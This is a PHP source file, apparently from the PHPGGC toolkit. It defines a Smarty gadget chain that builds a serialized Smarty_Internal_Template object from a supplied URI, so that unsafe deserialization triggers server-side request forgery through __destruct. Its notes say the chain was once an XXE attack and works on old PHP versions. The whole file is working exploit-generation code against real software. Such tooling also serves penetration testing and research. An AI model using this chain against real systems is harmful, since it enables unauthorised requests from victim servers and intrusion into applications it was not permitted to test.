<?php
namespace GadgetChain\Smarty;

class SSRF1 extends \PHPGGC\GadgetChain\SSRF
{
    public static $version = '?';
    public static $vector = '__destruct';
    public static $foundby = 'unknown';
    public static $author = 'mr_me';
    public static $information = '
    Reference: https://www.ptsecurity.com/upload/corporate/ww-en/analytics/Positive-Research-2014-eng.pdf (2014).
    This was originally an XXE gadget chain, but it does not work on recent PHP versions.
    Therefore, the gadget chain is now just an SSRF.
    According to raz0r, it "works only in PHP <5.4.12/5.3.22".
    ';

    public function generate(array $parameters)
    {
        return new \Smarty_Internal_Template($parameters['uri']);
    }
}
?>
